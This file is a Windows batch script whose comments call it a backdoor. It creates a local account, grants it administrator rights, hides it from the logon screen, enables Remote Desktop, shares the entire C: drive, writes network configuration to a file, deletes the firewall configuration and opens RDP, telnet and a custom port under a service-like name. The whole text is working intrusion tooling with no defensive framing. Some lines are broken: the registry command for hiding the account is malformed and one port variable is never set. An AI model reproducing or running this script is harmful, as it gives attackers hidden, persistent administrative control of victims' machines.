@echo off
command.com

REM Settings
set username=username
set password=password
set rdport=3389
set tnport=23
set rport=port#

net user %username% %password% /add

REM Pause For Process
ping localhost -n 2 >nul

REM Adding Admin Access The Backdoor 
net localgroup Administrators %username% /add

REM Hiding The Backdoor From Start Menu
REG add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /%username% /t REG_DWORD /d 0 /f >nul

REM Enabling Terminal Service
REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0

REM Share C:\
net share system=C:\ /unlimited

REM Stealing The IP Stuff
ipconfig /all >> C:\attach.txt

REM Deleting The Firewall Configuration
netsh firewall delete

REM Opening Ports
netsh firewall add portopening TCP %rdport% "WinSvcService"
netsh firewall add portopening TCP %tnport2% "WinSvcService"
netsh firewall add portopening TCP %rport% "WinSvcService"

cls
exit